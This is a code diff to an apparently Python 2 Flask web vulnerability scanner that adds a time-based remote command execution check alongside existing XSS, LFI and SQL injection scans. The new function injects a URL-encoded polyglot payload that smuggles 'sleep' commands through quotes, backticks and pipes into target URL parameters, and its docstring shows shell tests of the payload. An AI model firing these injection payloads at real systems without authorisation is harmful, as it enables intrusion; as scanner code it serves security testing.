@@ -87,6 +87,7 @@ def scan_sql_blind_time(vulns, url, fuzz):
 		else:
 			print "\t\t\033[94mTime Based SQLi (", name ,") Failed \033[0m for ", fuzz, " with the payload :", payload
 
+
 """scan_lfi
 Description: will scan every parameter for LFI, checking for the common root:x:0:0
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
@@ -104,6 +105,45 @@ def scan_lfi(vulns, url, fuzz):
 		print "\t\t\033[94mLFI Failed \033[0m for ", fuzz, " with the payload :", payload, inject
 
 
+"""scan_rce
+Description: use a polyglot vector to detect a RCE based on the response time
+Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
+"""
+def scan_rce(vulns, url, fuzz):
+	""" Some tests of context
+	$ time (ping -c 3 127.0.0.1`#'|sleep${IFS}4|'`"|sleep${IFS}4|";sleep${IFS}4 )     -   real	0m4.113s
+	ping: unknown host 127.0.0.1|sleep 	
+	4|
+	
+	$ time (ping -c 3 '127.0.0.1`#'|sleep${IFS}4|'`"|sleep${IFS}4|";sleep${IFS}4 ')   -   real	0m4.012s
+	ping: unknown host 127.0.0.1`#
+	`"|sleep${IFS}4|";sleep${IFS}4  : commande introuvable
+	
+	$ time (ping -c 3 "127.0.0.1`#'|sleep${IFS}4|'`"|sleep${IFS}4|";sleep${IFS}4 ")   -   real	0m4.008s
+	;sleep 	
+	4  : commande introuvable
+	"""
+	# Payload URL-encoded of `#'|sleep${IFS}4|'`\"|sleep${IFS}4|\";sleep${IFS}4 "
+	payload = "%60%23%27%7Csleep%24%7BIFS%7D4%7C%27%60%22%7Csleep%24%7BIFS%7D4%7C%22%3Bsleep%24%7BIFS%7D4%20"
+
+	# Do a request and check the response time
+	inject  = url.replace(fuzz+"=", fuzz+"="+payload)
+	time1   = datetime.datetime.now()
+	content = requests.get(inject).text
+	time2   = datetime.datetime.now()
+	diff    = time2 - time1
+	diff    = (divmod(diff.days * 86400 + diff.seconds, 60))[1]
+
+	# The payload will force a delay of 5s at least.
+	if diff > 2:
+		print "\t\t\033[93mRCE Detected \033[0m for ", fuzz, " with the payload :", payload
+		vulns['rce']  += 1
+		vulns['list'] += 'RCE|TYPE|'+inject+'|DELIMITER|'
+
+	else:
+		print "\t\t\033[94mRCE Failed \033[0m for ", fuzz, " with the payload :", payload
+
+
 """ Route /ping
 Description: Simple ping implementation to check if the server is up via the extension
 """
@@ -117,7 +157,7 @@ Description: main route for the flask application, every scan is launched from h
 """
 @app.route('/',methods=['GET'])
 def index():
-	vulns = {'xss': 0, 'sql': 0, 'lfi': 0, 'list':''}
+	vulns = {'rce': 0, 'xss': 0, 'sql': 0, 'lfi': 0, 'list':''}
 	
 	# Parse requests - extract arguments
 	args  = request.args
@@ -130,12 +170,14 @@ def index():
 
 		# Launch scans
 		for fuzz in matches:
-			print "\n---[ New parameter : "+fuzz+" ]---"
+			print "\n---[ New parameter " + fuzz + " for url: " + url + " ]---"
 			scan_xss(vulns, url, fuzz)
 			scan_lfi(vulns, url, fuzz)
 			scan_sql_error(vulns, url, fuzz)
 			scan_sql_blind_time(vulns, url, fuzz)
+			scan_rce(vulns, url, fuzz)
 
+	print vulns
 	# Display results as a json
 	return jsonify(vulns)
 
